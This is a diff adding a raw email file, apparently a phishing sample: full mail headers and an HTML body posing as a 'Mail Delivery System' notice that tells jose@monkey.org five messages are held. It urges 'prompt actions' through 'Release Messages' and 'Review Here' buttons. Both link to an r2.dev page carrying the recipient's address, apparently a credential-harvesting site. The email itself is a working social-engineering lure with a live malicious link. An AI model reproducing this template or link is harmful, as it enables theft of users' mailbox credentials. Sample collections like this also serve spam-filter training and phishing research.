@@ -1,0 +1,231 @@
+Return-Path: pilar.solano@coopenetcolon.com.ar
+Delivered-To: jose@monkey.org
+X-FDA: 82117387884.15.F76A0EB
+Received: from vms.coopenetcolon.com.ar (unknown [200.71.88.34])
+	by imf09.b.hostedemail.com (Postfix) with ESMTP id 8099618001C
+	for <jose@monkey.org>; Tue, 14 May 2024 15:30:20 +0000 (UTC)
+Authentication-Results: imf09.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=pass (imf09.b.hostedemail.com: domain of
+ pilar.solano@coopenetcolon.com.ar designates 200.71.88.34 as permitted
+ sender) smtp.mailfrom=pilar.solano@coopenetcolon.com.ar
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1715700621;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=RdF+OwoYYKuwhROR6XhCHnTll/qRYXeAQn1WrokBKZw=;
+	b=IKvkKy9UEh7yxnb2P7BrkuHfmbX7YCCYmJWmlgQy/GasANUpDi0DfKKyECZOp7ptkdOOnw
+	2y/8pzB0a4+OxdaL+GzV/japLk86f+qCqBO6TMT4m2vzQ2s7kq30HUXwxT7JWhYORKed14
+	HzSLzcW4xkq/ypMjTeiheZqAUb+KUzY=
+ARC-Authentication-Results: i=1;	imf09.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=pass (imf09.b.hostedemail.com: domain of
+ pilar.solano@coopenetcolon.com.ar designates 200.71.88.34 as permitted
+ sender) smtp.mailfrom=pilar.solano@coopenetcolon.com.ar
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1715700621; a=rsa-sha256;
+	cv=none;
+	b=HwOvorlrKJiof40lG6go7xHOJn9ztqihdfYQ8+SBHKep24ZD3h0YHe1HrvM/qWI+Z0QFXY
+	36BvwiTvlvhy4Whl2l6wOvSC3KDhPD1J5UXdGcmEqDdu86WCaFjP+vqQjRTEz3wODHORA2
+	Qz79ZAPNMFW1wDGVVo+t3P7RKIvZuR4=
+Received: from spamwall2.coopenetcolon.com.ar (unknown [10.229.64.37])
+	by vms.coopenetcolon.com.ar (Postfix) with ESMTP id 9A35FA71DC
+	for <jose@monkey.org>; Tue, 14 May 2024 12:30:02 -0300 (ART)
+Received: by spamwall2.coopenetcolon.com.ar (Postfix, from userid 27)
+	id 6A0E84B499; Tue, 14 May 2024 12:30:02 -0300 (ART)
+Received: from coopenetcolon.com.ar (unknown [104.167.223.52])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(No client certificate requested)
+	by spamwall2.coopenetcolon.com.ar (Postfix) with ESMTPS id 4993D4B49A
+	for <jose@monkey.org>; Tue, 14 May 2024 12:29:56 -0300 (ART)
+From: Mail Delivery System monkey.org    <pilar.solano@coopenetcolon.com.ar>
+To: jose@monkey.org
+Subject:
+ You Have Received (5) Pending Massages On, monkey.org <jose@monkey.org>
+Date: 14 May 2024 08:29:56 -0700
+Message-ID: <20240514082955.70557FAEBF41C159@coopenetcolon.com.ar>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 8099618001C
+X-Spam-Status: No, score=8.80
+X-Stat-Signature: 4ka7qheznawik4wgrrk9ct7c4dy4tf5m
+X-Rspam-User: 
+X-HE-Tag: 1715700620-306606
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+j+uDrXbBVCHMSpOKK7xf2Hbmd0V6JMlfsEMb/hxk8JWN?=
+ =?utf-8?q?aeejFIau//BKhWtxPCXxAUU65WMdqW7VDuerN1NcXceD1sF9GztdzTTkw7IHALkxQ?=
+ =?utf-8?q?iXB0CgKinjngrI+Xg4u+zrm2Xy9R/O5kV7BLsfNBwGyCcFUAwjdAgdkj3BeMl3IH0?=
+ =?utf-8?q?LY068sDw+u0KVSHEYiZxTwhVzQZcDabCYeDmmpARtdcfGW2zO0dNIn7gDCcrhGdHn?=
+ =?utf-8?q?HKcR8+csPe4Eu86Ro/pVDKPNSlv3QJr13TATlRv4UXqQcOBL3MoPnAe18xUhqxTuI?=
+ =?utf-8?q?GCyhtTWrMroBfO9JQ8jOgCzhEOx6Z0QWj5c1arvcHGnk7buvBrGFaFCK0u7Gl0Wxy?=
+ =?utf-8?q?GUCx?=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 137
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body style=3D"margin: 0.5em;">
+<table style=3D"width: 531px; color: rgb(38, 40, 42); text-transform: none;=
+ letter-spacing: normal; font-family: &quot;Helvetica Neue&quot;, Helvetica=
+, Arial, sans-serif; font-size: 13px; font-style: normal; font-weight: 400;=
+ word-spacing: 0px; vertical-align: top; white-space: normal; border-collap=
+se: collapse; min-height: 100%; orphans: 2; widows: 2; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" cellspacing=3D"0" cellpadding=3D"=
+0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; width: 531px; font-family: &quot;Google Sans&quot=
+;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertical-align: top;"=
+>
+<div style=3D"margin: 0px auto; max-width: 630px;">
+<table style=3D"width: 531px; color: rgb(38, 40, 42); text-transform: none;=
+ letter-spacing: normal; font-family: &quot;Helvetica Neue&quot;, Helvetica=
+, Arial, sans-serif; font-size: 13px; font-style: normal; font-weight: 400;=
+ word-spacing: 0px; vertical-align: top; white-space: normal; border-collap=
+se: collapse; min-height: 100%; orphans: 2; widows: 2; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" cellspacing=3D"0" cellpadding=3D"=
+0"><tbody><tr><td style=3D"margin: 0px; width: 531px; font-family: &quot;Go=
+ogle Sans&quot;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertica=
+l-align: top;"><div style=3D"margin: 0px auto; max-width: 630px;">
+<table style=3D"width: 531px; color: rgb(38, 40, 42); text-transform: none;=
+ letter-spacing: normal; font-family: &quot;Helvetica Neue&quot;, Helvetica=
+, Arial, sans-serif; font-size: 13px; font-style: normal; font-weight: 400;=
+ word-spacing: 0px; vertical-align: top; white-space: normal; border-collap=
+se: collapse; min-height: 100%; orphans: 2; widows: 2; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" cellspacing=3D"0" cellpadding=3D"=
+0"><tbody><tr><td style=3D"margin: 0px; width: 531px; font-family: &quot;Go=
+ogle Sans&quot;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertica=
+l-align: top;"><div style=3D"margin: 0px auto; max-width: 630px;"><table st=
+yle=3D"width: 531px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Ar=
+ial, sans-serif; vertical-align: top; border-collapse: collapse; min-height=
+: 100%;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; width: 531px; font-family: &quot;Google Sans&quot=
+;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertical-align: top;"=
+><div style=3D"margin: 0px auto; width: 519px; height: 251px; max-width: 63=
+0px;">
+<table style=3D"width: 531px; color: rgb(38, 40, 42); text-transform: none;=
+ letter-spacing: normal; font-family: &quot;Helvetica Neue&quot;, Helvetica=
+, Arial, sans-serif; font-size: 13px; font-style: normal; font-weight: 400;=
+ word-spacing: 0px; vertical-align: top; white-space: normal; border-collap=
+se: collapse; min-height: 100%; orphans: 2; widows: 2; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" cellspacing=3D"0" cellpadding=3D"=
+0"><tbody><tr><td style=3D"margin: 0px; width: 531px; font-family: &quot;Go=
+ogle Sans&quot;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertica=
+l-align: top;"><div style=3D"margin: 0px auto; max-width: 630px;"><table st=
+yle=3D"width: 531px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Ar=
+ial, sans-serif; vertical-align: top; border-collapse: collapse; min-height=
+: 100%;" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; width: 531px; font-family: &quot;Google Sans&quot=
+;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertical-align: top;"=
+><div style=3D"margin: 0px auto; max-width: 630px;"><table style=3D"width: =
+531px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-seri=
+f; vertical-align: top; border-collapse: collapse; min-height: 100%;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; width: 531px; font-family: &quot;Google Sans&quot=
+;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertical-align: top;"=
+><div style=3D"margin: 0px auto; max-width: 630px;"><table style=3D"width: =
+531px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-seri=
+f; vertical-align: top; border-collapse: collapse; min-height: 100%;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; width: 531px; font-family: &quot;Google Sans&quot=
+;, Roboto, RobotoDraft, Helvetica, Arial, sans-serif; vertical-align: top;"=
+><div style=3D"margin: 0px auto; width: 519px; height: 251px; max-width: 63=
+0px;"><div style=3D"color: rgb(44, 54, 58); font-family: Roboto, sans-serif=
+; font-size: 14px; border-top-color: currentColor; border-top-width: 0px; b=
+order-top-style: none; box-sizing: border-box; background-color: rgb(244, 2=
+48, 245);">
+<div style=3D"width: 591px; height: 24px; padding-top: 5px; padding-right: =
+5px; padding-bottom: 5px; margin-left: 18px; border-top-color: currentColor=
+; border-top-width: 0px; border-top-style: none; float: left; box-sizing: b=
+order-box;"><div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Seg=
+oe WP", Tahoma, Arial, sans-serif; font-size: 13px; border-top-color: curre=
+ntColor; border-top-width: 0px; border-top-style: none; box-sizing: border-=
+box;'><span style=3D"box-sizing: border-box;">
+<font size=3D"2"><br class=3D"gmail-Apple-interchange-newline"><br>Message =
+generated from&nbsp;<span>&nbsp;</span><a style=3D"color: rgb(17, 85, 204);=
+" href=3D"http://angelshipco.com/" target=3D"_blank">monkey.org</a>&nbsp;so=
+urce.</font></span></div></div><div style=3D"box-sizing: border-box;"><div =
+style=3D"width: 5px; height: 30px; border-top-color: currentColor; border-t=
+op-width: 0px; border-top-style: none; box-sizing: border-box; background-c=
+olor: rgb(86, 166, 89);"></div></div></div>
+<div style=3D"color: rgb(44, 54, 58); font-family: Roboto, sans-serif; font=
+-size: 14px; box-sizing: border-box;"><br></div><div style=3D"color: rgb(44=
+, 54, 58); font-family: Roboto, sans-serif; font-size: 14px; box-sizing: bo=
+rder-box;">&nbsp;</div><table style=3D"width: 629px; color: rgb(44, 54, 58)=
+; font-family: calibri; font-size: 16px; border-collapse: collapse;" border=
+=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: bo=
+rder-box;">
+<td align=3D"left" style=3D"margin: 0px; box-sizing: border-box;"><table st=
+yle=3D"width: 627px; border-collapse: collapse; min-width: 600px;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: bord=
+er-box;"><tr align=3D"center" style=3D"box-sizing: border-box;"><td style=
+=3D"margin: 0px; box-sizing: border-box;"><table style=3D"border-collapse: =
+collapse; max-width: 600px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
+0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border=
+-box;">
+<td style=3D"margin: 0px; box-sizing: border-box;"><table style=3D"width: 5=
+13px; border-collapse: collapse;" border=3D"0" cellspacing=3D"0" cellpaddin=
+g=3D"0"></table></td></tr><tr style=3D"box-sizing: border-box;"><td style=
+=3D"margin: 0px; box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;5 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;">
+<td style=3D"margin: 0px; box-sizing: border-box;"><div style=3D"border-top=
+-color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
+zing: border-box;">&nbsp;</div><div style=3D"box-sizing: border-box;">&nbsp=
+;</div><font size=3D"1"><font size=3D"2">Some messages are restrained from =
+delivering to&nbsp;<u><font color=3D"#0000ff"><a style=3D"color: rgb(17, 85=
+, 204);" target=3D"_blank">jose@monkey.org</a></font></u><font style=3D"box=
+-sizing: border-box;"><br><br></font></font></font>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+<font size=3D"2">Due to low bandwidth we notify you to take prompt actions<=
+/font></p>
+<a style=3D"background: rgb(36, 107, 193); border-width: thick; border-colo=
+r: currentColor; margin: 2px; padding: 10px; outline: 0px; border-image: no=
+ne; color: rgb(255, 255, 255); float: left; display: block; box-sizing: bor=
+der-box; text-decoration-line: none;" href=3D"https://pub-3d320c5f8b9847de9=
+a1f7ede095a8504.r2.dev/pub-secure-ipfs-server.r2.devautipfspreadstalogginse=
+cureip.htm#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"><font size=
+=3D"3">Release Messages</font></a>
+<a style=3D"background: rgb(179, 179, 179); border-width: thick; border-col=
+or: currentColor; margin: 2px; padding: 10px; outline: 0px; border-image: n=
+one; color: rgb(255, 255, 255); float: left; display: block; box-sizing: bo=
+rder-box; text-decoration-line: none;" href=3D"https://pub-3d320c5f8b9847de=
+9a1f7ede095a8504.r2.dev/pub-secure-ipfs-server.r2.devautipfspreadstaloggins=
+ecureip.htm#jose@monkey.org" target=3D"_blank" rel=3D"noreferrer"><font siz=
+e=3D"3">Review Here</font></a>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;">&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; b=
+ox-sizing: border-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1re=
+m; box-sizing: border-box;"></p>
+<h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-weight: 500; margin=
+-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;"><font size=3D"1"=
+><font size=3D"2"><font size=3D"3"><font size=3D"2">Message should be moved=
+ to the inbox.</font></font></font></font></h5></td></tr></tbody></table></=
+td></tr></tbody></table></td></tr></tbody></table></div></td></tr></tbody><=
+/table></div></td></tr></tbody></table></div></td></tr></tbody></table></di=
+v></td></tr></tbody></table></div></td></tr></tbody></table>
+</div></td></tr></tbody></table></div></td></tr></tbody></table></div></td>=
+</tr></tbody></table></body></html>
+
